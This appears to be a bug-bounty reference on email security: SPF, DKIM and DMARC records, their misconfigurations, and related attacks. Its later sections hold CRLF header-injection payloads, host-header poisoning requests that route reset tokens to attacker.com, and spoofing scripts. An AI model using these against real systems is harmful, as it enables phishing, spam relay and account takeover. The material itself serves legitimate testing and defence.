# Email Security — SPF, DKIM, DMARC, Attack Techniques
> Source: RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC), Postmark, MXToolbox | RAG Knowledge Base | Full detail preserved

---

## Overview — Email Authentication Stack

Email authentication uses three layered protocols:
1. **SPF** — authorizes which mail servers can send on behalf of a domain
2. **DKIM** — cryptographically signs email content and headers
3. **DMARC** — policy engine that uses SPF+DKIM results to decide what to do with failing mail, plus reporting

All three are published as DNS TXT records. Together they prevent spoofing and domain impersonation. Missing or misconfigured records = spoofing possible = bug bounty finding.

---

## SPF (Sender Policy Framework) — RFC 7208

### DNS Record Location

`example.com.  TXT  "v=spf1 ..."`

### Mechanisms (What Authorizes Sending)

| Mechanism | Example | Description |
|---|---|---|
| `ip4:` | `ip4:1.2.3.4` or `ip4:1.2.3.0/24` | Specific IPv4 address or CIDR range authorized |
| `ip6:` | `ip6:2001:db8::/32` | IPv6 address or range authorized |
| `a` | `a` or `a:mail.example.com` | A record of domain (or specified hostname) is authorized |
| `mx` | `mx` | All MX record hosts are authorized to send |
| `include:` | `include:spf.google.com` | Include another domain's SPF policy |
| `redirect=` | `redirect=_spf.example.com` | Delegate entire SPF policy to another domain |
| `exists:` | `exists:%{i}.bl.example.com` | True if DNS lookup returns any record |
| `all` | `-all` | Matches everything (used as final catch-all) |

### Qualifiers (Result Modifier Before Mechanism)

| Qualifier | Symbol | Result | Meaning |
|---|---|---|---|
| Pass | `+` (default) | pass | Authorize the mail (default — can be omitted) |
| Fail | `-` | fail | Reject the mail — hard fail |
| SoftFail | `~` | softfail | Accept but mark suspicious |
| Neutral | `?` | neutral | No policy — no enforcement |

### Example SPF Records

```
# Restrictive and correct
v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all

# Google Workspace only
v=spf1 include:_spf.google.com ~all

# Office 365
v=spf1 include:spf.protection.outlook.com -all

# SoftFail only (weak — spoofing largely possible)
v=spf1 ip4:203.0.113.0/24 ~all

# WORST: explicitly authorizes everything
v=spf1 +all

# No SPF record = trivial spoofing
(no TXT record at all)
```

### SPF Misconfiguration Vulnerability Table

| Misconfiguration | Attack Impact |
|---|---|
| No SPF record | Anyone can spoof From header; no blocking mechanism at all |
| `+all` or `?all` at end | Explicitly authorizes all IPs worldwide as legitimate senders |
| `~all` only (SoftFail) | Most servers accept; spoofing succeeds unless DMARC rejects |
| More than 10 `include:` or `a:` lookups | PermError → many servers treat as pass → SPF bypass |
| `ip4:0.0.0.0/0` | Equivalent to `+all` — authorizes all IPv4 addresses |
| `include:` to compromised domain | Transitive trust — if included domain is compromised, attacker can spoof |
| Missing sub-domain SPF | `v=spf1 ... -all` on root doesn't protect `mail.example.com` unless separate record |

### SPF DNS Lookup Limit — The 10-Lookup Trap

SPF allows a maximum of **10 DNS lookups** while processing a record. Each `include:`, `a:`, `mx:`, `exists:`, and `redirect=` costs one lookup. Exceeding 10 = `PermError`.

Many servers treat `PermError` as a pass (not a fail), which means SPF is bypassed when records are over-limit. Some large orgs exceed the limit and don't know it.

**Check lookup count:**
```bash
# Tools: mxtoolbox.com/spf.aspx, dmarcian.com/spf-survey/
python3 -c "
import dns.resolver
# Manual count by expanding all includes recursively
"
```

### Testing SPF

```bash
# Check SPF record
dig TXT example.com | grep spf
dig +short TXT example.com
nslookup -type=TXT example.com

# Python SPF check
python3 -c "
import spf
result, code, explanation = spf.check2(
    i='1.2.3.4',
    s='test@example.com',
    h='mail.example.com'
)
print(result, code, explanation)
"

# Online tools
# https://mxtoolbox.com/spf.aspx
# https://www.kitterman.com/spf/validate.html
```

---

## DKIM (DomainKeys Identified Mail) — RFC 6376

### DNS Record Location

`SELECTOR._domainkey.example.com.  TXT  "v=DKIM1; k=rsa; p=BASE64_PUBLIC_KEY"`

### Record Tags

| Tag | Required | Description |
|---|---|---|
| `v=DKIM1` | Required | Version, always DKIM1 |
| `k=rsa` | Optional (default rsa) | Key type: `rsa` or `ed25519` |
| `p=` | Required | Base64-encoded public key (empty = key revoked) |
| `h=sha256` | Optional | Hash algorithm (sha1 deprecated, sha256 recommended) |
| `s=email` | Optional | Service type (`email` or `*` for any) |
| `t=s` | Optional | Flags: `s` = strict subdomain matching |
| `n=` | Optional | Human-readable notes |

### Discovering DKIM Selectors

There is no universal selector discovery — selectors vary by provider. Common ones to try:

```bash
# Brute force selectors
selectors=(default selector1 selector2 google k1 k2 mail dkim email 
           s1 s2 20210112 20220101 20230101 20240101 protonmail 
           mandrill smtp zoho mailchimp sendgrid)

for selector in "${selectors[@]}"; do
  result=$(dig +short TXT ${selector}._domainkey.example.com 2>/dev/null)
  if [ ! -z "$result" ]; then
    echo "Found: $selector -> $result"
  fi
done

# Common provider selectors
# Google Workspace: google, s1, s2
# Microsoft 365: selector1, selector2
# Amazon SES: amazonses (with subdomain prefix)
# Mailchimp: k1, k2
# SendGrid: s1, s2
# Postmark: pm (+ date-based)
# ProtonMail: protonmail
```

### DKIM-Signature Header Anatomy

```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=example.com; s=selector1;
  h=from:to:subject:date:message-id:content-type;
  bh=BASE64_BODY_HASH;
  b=BASE64_SIGNATURE
```

| Field | Description |
|---|---|
| `v=1` | Version |
| `a=rsa-sha256` | Signing algorithm |
| `c=relaxed/relaxed` | Canonicalization (header/body): simple or relaxed |
| `d=example.com` | Signing domain (should align with From: for DMARC) |
| `s=selector1` | Selector name (for DNS key lookup) |
| `h=from:to:subject:date` | Headers that are signed |
| `bh=` | Base64 hash of canonicalized body |
| `b=` | Base64 signature of headers |

### DKIM Misconfiguration Vulnerability Table

| Misconfiguration | Attack Impact |
|---|---|
| No DKIM record | Email content/From not cryptographically protected; spoofing undetected |
| 512-bit RSA key | Cryptographically broken — full key factorization feasible |
| 1024-bit RSA key | Below modern standard; at risk; RSA-2048 minimum |
| `p=` field empty | Key revoked; all DKIM signatures fail — mail may be rejected or treated as unsigned |
| `h=` not including `From` | From header not signed; header injection via prepending From header viable |
| `c=relaxed/relaxed` | Whitespace modification in headers/body allowed; some header injection possible |
| Signing subdomain but DMARC on root | DKIM d= doesn't align with From: domain → DMARC alignment fails |

### DKIM Key Size Recommendations

- RSA-512: Broken (factored in hours on modern hardware)
- RSA-1024: Deprecated; NVD lists as weak
- RSA-2048: Minimum acceptable
- RSA-4096: Recommended for new deployments
- Ed25519: Modern alternative, smaller key with equal security

**Check key size:**
```bash
# Decode and check
dig +short TXT selector1._domainkey.example.com | grep -o 'p=[^;]*' | \
  sed 's/p=//' | base64 -d 2>/dev/null | openssl pkey -inform DER -text -noout 2>/dev/null | grep 'bit'
```

---

## DMARC (Domain-based Message Authentication, Reporting & Conformance) — RFC 7489

### DNS Record Location

`_dmarc.example.com.  TXT  "v=DMARC1; p=reject; ..."`

### Record Tags

| Tag | Required | Values | Description |
|---|---|---|---|
| `v=DMARC1` | Required | DMARC1 | Version |
| `p=` | Required | none, quarantine, reject | Policy for failing mail on primary domain |
| `sp=` | Optional | none, quarantine, reject | Subdomain policy (inherits `p=` if absent) |
| `pct=` | Optional | 0–100 (default 100) | Percentage of failing mail to apply policy |
| `rua=` | Optional | `mailto:addr` | Aggregate report destination (daily XML reports) |
| `ruf=` | Optional | `mailto:addr` | Forensic/failure report destination |
| `adkim=` | Optional | r, s (default r) | DKIM alignment: r=relaxed, s=strict |
| `aspf=` | Optional | r, s (default r) | SPF alignment: r=relaxed, s=strict |
| `fo=` | Optional | 0, 1, d, s | Failure reporting options |
| `rf=` | Optional | afrf (default) | Report format |
| `ri=` | Optional | seconds (default 86400) | Reporting interval |

### Policy Values

| Policy | Effect |
|---|---|
| `p=none` | Monitoring only — mail delivered regardless of SPF/DKIM result. Spoofing succeeds. |
| `p=quarantine` | Failing mail sent to spam/junk folder |
| `p=reject` | Failing mail rejected at SMTP layer; never reaches inbox |

### DMARC Alignment

DMARC requires that the **From: header domain** aligns with either:
- The **SPF authenticated domain** (envelope MAIL FROM), OR
- The **DKIM signing domain** (`d=` tag)

**Relaxed alignment (default):** Subdomain is OK. `mail.example.com` aligns with `example.com`.
**Strict alignment:** Exact domain match only. `mail.example.com` does NOT align with `example.com`.

### DMARC Misconfiguration Vulnerability Table

| Misconfiguration | Attack Impact |
|---|---|
| No DMARC record | No enforcement; servers use their own policies; spoofing broadly possible |
| `p=none` | Reports only; mail delivered; spoofing succeeds; monitoring blind spot |
| `pct=50` with `p=reject` | 50% of failing mail delivered; attacker succeeds ~50% of attempts |
| `sp=none` with `p=reject` | Subdomains unprotected; spoof from `anything.example.com` |
| Missing `rua=` | No visibility into spoofing campaigns targeting your domain |
| `adkim=r` + `aspf=r` (relaxed) | Subdomain alignment accepted — more lenient than strict |

### Complete Testing Command Set

```bash
# Check all three email security records
dig +short TXT example.com              # SPF
dig +short TXT _dmarc.example.com       # DMARC
dig +short TXT selector1._domainkey.example.com  # DKIM selector1
dig +short TXT selector2._domainkey.example.com  # DKIM selector2
dig MX example.com                      # MX records

# Online all-in-one tools
# https://mxtoolbox.com/emailhealth/
# https://dmarcian.com/domain-checker/
# https://easydmarc.com/tools/domain-checker

# Command-line DMARC analyzer
swaks --to test@example.com --from spoofed@example.com \
  --server mail.example.com --auth-user your@domain.com
```

---

## Email Header Injection (Newline/CRLF Injection)

### Vulnerability

User-controlled input included unsanitized in email headers. Injecting CRLF (`\r\n`) allows adding arbitrary headers.

**Vulnerable PHP:**
```php
$email = $_POST['email'];  // attacker-controlled
mail("admin@example.com", "Contact Form", $body, "From: $email");
// Injected: "attacker@evil.com\r\nBcc: victim@example.com"
// Result: admin receives email, victim also receives it (BCC'd)
```

### Injection Payloads

```
# Inject Bcc to spam relay
attacker@evil.com%0d%0aBcc:%20victim@example.com

# Inject CC to copy to attacker
attacker@evil.com%0aCC:victim1@target.com,victim2@target.com

# Inject new Subject
Normal%0d%0aSubject: You won a prize!

# Inject body (double CRLF = header/body separator)
attacker@evil.com%0d%0a%0d%0aNew email body injected here

# Subject header injection (for subject parameter)
Normal Subject%0d%0aX-Custom-Header: malicious-value

# Complete email hijack: inject new headers to create forged email
attacker@evil.com%0d%0aFrom: legitimate@company.com%0d%0aSubject: Security Alert
```

### CRLF Variants to Try

```
%0a       (URL-encoded \n — LF only)
%0d       (URL-encoded \r — CR only)
%0d%0a    (URL-encoded \r\n — full CRLF)
\n        (literal newline — if not URL encoded)
\r\n      (literal CRLF)
%0D%0A    (uppercase hex)
%0a%0d    (reversed)
%25%30%61 (double URL encoded)
```

### Impact

- Spam relay through legitimate mail server
- Phishing emails appearing to come from trusted domain
- BCC exfiltration — copy all contact form submissions to attacker
- Social engineering with forged From headers

---

## Password Reset Link Poisoning via Host Header

### Attack Flow

1. Submit password reset for victim's email address
2. Intercept HTTP request, change `Host: legitimate.com` → `Host: attacker.com`
3. Server generates: `https://attacker.com/reset?token=VALID_TOKEN`
4. Victim clicks link in email → token delivered to attacker's server
5. Attacker visits `https://legitimate.com/reset?token=VALID_TOKEN` → full account takeover

**Vulnerable Code:**
```python
# Vulnerable: uses request.host to build reset URL
def forgot_password(request):
    user = get_user(request.POST['email'])
    token = generate_reset_token(user)
    reset_url = f"https://{request.host}/reset/{token}"  # BUG: host from request!
    send_email(user.email, reset_url)
```

**HTTP Request with Poisoned Host:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Alternative Poisoning Headers:**
```http
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Original-URL: attacker.com
Forwarded: host=attacker.com
X-Rewrite-URL: https://attacker.com
```

**Testing:** Use Burp Collaborator. Submit password reset with modified Host, monitor collaborator for token arrival.

**Related Attacks:** Same Host header poisoning can affect:
- Cache poisoning (`X-Forwarded-Host` stored in cache)
- SSRF via routing (internal proxies use Host to route)
- SQL injection (if Host header interpolated into query)
- Internal service access (if Host controls which backend is targeted)

---

## Subdomain Used for Email Phishing — SPF/DMARC Gaps

**Scenario:** Main domain has DMARC `p=reject` but subdomain doesn't have its own DMARC:

```
_dmarc.example.com:         "v=DMARC1; p=reject; sp=none"
                              ↑ subdomains have NO enforcement!

_dmarc.mail.example.com:    (no record)

# Attacker sends email: From: billing@mail.example.com
# sp=none → no enforcement on subdomains → mail delivered
```

**Check:** When `sp=` is not set, subdomain policy inherits the `p=` value. When `sp=none` is explicit, all subdomains are unprotected regardless of `p=reject`.

---

## Email Security Bug Bounty Quick Reference

| Finding | Severity | Condition |
|---|---|---|
| No SPF record on primary domain | Medium | Domain has MX, can receive email, but no SPF |
| SPF `+all` | High | Any IP can pass SPF — universal spoofing |
| SPF > 10 lookups (PermError) | Medium | SPF processing fails — bypass possible |
| No DMARC record | Medium | No enforcement policy |
| DMARC `p=none` | Low–Medium | Monitoring only; spoofing succeeds |
| DMARC `sp=none` with `p=reject` | Medium | Subdomains unprotected |
| No DKIM at all | Low | No cryptographic signing |
| DKIM 512/1024-bit key | Medium | Weak key, factorable or deprecated |
| Email header injection | High | CRLF in email headers — spam relay |
| Password reset host header poisoning | High–Critical | Token delivered to attacker → ATO |
| Missing DMARC on acquired/partner domains | Medium | Org's reputation abused |

---

## Spoofing Test (Authorized Testing Only)

```bash
# Send test email with spoofed From via SWAKS
swaks \
  --to recipient@test.com \
  --from spoofed@target.com \
  --server mail.target.com \
  --header "Subject: DMARC Test" \
  --body "This is a spoofing test"

# Or via Python
import smtplib
from email.mime.text import MIMEText

msg = MIMEText("Spoofing test body")
msg['Subject'] = "DMARC Spoofing Test"
msg['From'] = "ceo@target.com"
msg['To'] = "your@test.com"

with smtplib.SMTP('mail.target.com', 25) as smtp:
    smtp.sendmail("attacker@evil.com", ["your@test.com"], msg.as_string())
```

**Note:** Only perform spoofing tests with explicit written authorization. Most bug bounty programs accept the DNS misconfiguration finding without actual spoofing PoC.
